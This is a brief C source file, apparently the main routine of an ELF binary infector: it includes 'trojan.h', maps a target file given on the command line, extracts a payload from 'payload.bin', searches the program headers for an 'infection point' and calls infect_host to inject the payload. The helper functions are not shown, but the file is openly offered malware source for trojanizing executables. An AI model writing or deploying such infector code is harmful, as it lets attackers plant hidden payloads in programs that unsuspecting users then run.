#include "trojan.h"



int main(int argc,char **argv)
{
	open_map_file(argv[1]);

	extract_payload("payload.bin");

	int segment = find_phdr();
	if(segment<0)
	{
		printf("unable to find usable infection point\n");
		exit(EXIT_FAILURE);
	}
	
	infect_host(segment);	
	

	return 0;
}
